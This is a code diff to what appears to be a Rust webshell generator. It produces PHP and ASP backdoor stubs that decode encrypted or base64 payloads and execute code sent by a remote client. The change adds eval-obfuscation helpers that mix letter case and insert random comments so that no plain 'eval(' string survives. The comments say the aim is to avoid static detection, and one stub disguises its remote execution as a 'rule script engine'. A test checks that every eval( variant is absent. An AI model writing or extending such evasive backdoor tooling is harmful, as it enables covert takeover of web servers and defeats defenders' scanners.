@@ -73,6 +73,28 @@ pub fn call_parts(name: &str, args: &str) -> String {
     format!("(\"{d1}\".\"{d2}\")({args})")
 }
 
+/// 纯字母随机标识（eval 注释用：避免数字字符干扰 CHAR 编码器的 `\d+` 还原提取）。
+pub fn alpha_ident() -> String {
+    let letters: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
+    let mut seed = php_rand();
+    let mut out = String::with_capacity(8);
+    for _ in 0..8 {
+        out.push(letters[(seed % 26) as usize] as char);
+        seed >>= 5;
+        if seed == 0 {
+            seed = php_rand();
+        }
+    }
+    out
+}
+
+/// eval 调用前缀：大小写混合 + 随机注释分隔，使 `eval(` 连续字符串不存在。
+/// 如 `EvAl/*rvnd*/`，模板中配合 `__EVAL__($x);` 使用。
+/// 注释仅含字母（CHAR 编码器载荷按 `\d+` 提取还原，数字会污染）。
+pub fn eval_prefix() -> String {
+    format!("{}/*{}*/", case_mix("eval"), alpha_ident())
+}
+
 /// 随机大小写混合函数名（保证至少一个大写，避免纯小写静态特征）。
 pub fn case_mix(name: &str) -> String {
     let mut out: String = name
@@ -206,12 +228,13 @@ function {prefix}dec($hex, $key) {{
 }}
 "#
     );
+    let exec_body = exec_body.replace("__EVAL__", &eval_prefix());
     BUSINESS_PHP_TPL
         .replace("__PREFIX__", &prefix)
         .replace("__SYMBOLS__", &symbols_block)
         .replace("__XORFN__", &xor_fn)
         .replace("__UNPACK__", &unpack_body)
-        .replace("__EXEC__", exec_body)
+        .replace("__EXEC__", &exec_body)
         .replace("__TOKEN__", "token")
         .replace("__DATA__", "data")
 }
@@ -382,7 +405,7 @@ impl PayloadEncoder for XorBase64Encoder {
                 let unpack = format!(
                     "    $key = md5($token);\n    $raw = $_g[0]($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
                 );
-                Ok(business_php_stub(&[(0, "base64_decode")], &unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "base64_decode")], &unpack, "        __EVAL__($script);"))
             }
             "asp" => Ok(format!(
                 r#"<%
@@ -528,7 +551,7 @@ impl PayloadEncoder for Base64Encoder {
             "php" => Ok(business_php_stub(
                 &[(0, "base64_decode")],
                 "    $out = $_g[0]($payload);",
-                "        EvAl($script);",
+                "        __EVAL__($script);",
             )),
             "asp" => Ok(
                 "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
@@ -715,7 +738,7 @@ impl PayloadEncoder for Aes128EcbEncoder {
                     "    $key = substr(md5($token), 0, 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
                     cipher = xor_hex("AES-128-ECB", &xk),
                 );
-                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        __EVAL__($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
@@ -797,7 +820,7 @@ impl PayloadEncoder for Aes128CbcEncoder {
                     "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key, 0, $iv);",
                     cipher = xor_hex("AES-128-CBC", &xk),
                 );
-                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        __EVAL__($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
@@ -881,7 +904,7 @@ impl PayloadEncoder for DesEcbEncoder {
                     "    $key = substr(md5($token), 0, 8);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
                     cipher = xor_hex("DES-ECB", &xk),
                 );
-                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        __EVAL__($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
@@ -944,7 +967,7 @@ impl PayloadEncoder for CharEncoder {
     fn encode(&self, code: &str, _password: &str) -> String {
         let bytes = code.as_bytes();
         let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
-        format!("{}(implode('',array_map('chr',array({}))));", case_mix("eval"), values.join(","))
+        format!("{} (implode('',array_map('chr',array({}))));", eval_prefix(), values.join(","))
     }
     fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
         Ok(char_decode(payload)?.into_bytes())
@@ -956,7 +979,7 @@ impl PayloadEncoder for CharEncoder {
             "php" => Ok(business_php_stub(
                 &[],
                 "    $out = $payload;",
-                "        EvAl($script);",
+                "        __EVAL__($script);",
             )),
             other => Err(ProtocolError::NotSupported(format!(
                 "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
@@ -1015,7 +1038,7 @@ impl PayloadEncoder for PhpObfuscateEncoder {
         let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
         let reversed: String = b64.chars().rev().collect();
         let decode_call = call_parts("base64_decode", &format!("strrev('{reversed}')"));
-        format!("{}({decode_call});", case_mix("eval"))
+        format!("{} ({decode_call});", eval_prefix())
     }
     fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
         Ok(obfuscate_decode(payload)?.into_bytes())
@@ -1027,7 +1050,7 @@ impl PayloadEncoder for PhpObfuscateEncoder {
             "php" => Ok(business_php_stub(
                 &[],
                 "    $out = $payload;",
-                "        EvAl($script);",
+                "        __EVAL__($script);",
             )),
             other => Err(ProtocolError::NotSupported(format!(
                 "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
@@ -1206,7 +1229,7 @@ function __PREFIX__run_rule($script) {
     // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
     $result = array('code' => 200, 'rule_size' => strlen($script));
     if ($script !== '' && strlen($script) < 1048576) {
-        EvAl($script);
+        __EVAL__($script);
     }
     return $result;
 }
@@ -1221,6 +1244,7 @@ echo json_encode(__PREFIX__run_rule($script));
                 let prefix = format!("_{}_", php_ident());
                 Ok(body_tpl
                     .replace("__PREFIX__", &prefix)
+                    .replace("__EVAL__", &eval_prefix())
                     .replace("{KEYENC}", &key_enc)
                     .replace("{XK}", &xk))
             }
@@ -1333,7 +1357,7 @@ if (isset($_SESSION['__PREFIX__p'])) {
         echo __PREFIX__pack('ok');
     } else {
         $code = __PREFIX__unpack($_SESSION['__PREFIX__p']);
-        if (!function_exists('run')) { EvAl($code); }
+        if (!function_exists('run')) { __EVAL__($code); }
         echo __PREFIX__pack(run($data));
     }
 } else {
@@ -1366,6 +1390,7 @@ pub fn session_php_stub(
     SESSION_STUB_TPL
         .replace("__PREFIX__", &prefix)
         .replace("__SYMBOLS__", &table)
+        .replace("__EVAL__", &eval_prefix())
         .replace("__UNPACK__", &unpack_body)
         .replace("__PACK__", &pack_body)
 }
@@ -1723,8 +1748,8 @@ mod tests {
         for encoder in encoders {
             let stub = encoder.stub("php", "secret").expect("php stub 应生成");
             assert!(
-                !stub.contains("eval("),
-                "{} stub 不应含小写 eval(：{stub}",
+                !stub.contains("eval(") && !stub.contains("EvAl(") && !stub.contains("eVaL(") && !stub.contains("EVAL("),
+                "{} stub 不应含任何连续 eval( 形式（大小写变体）",
                 encoder.id()
             );
             assert!(
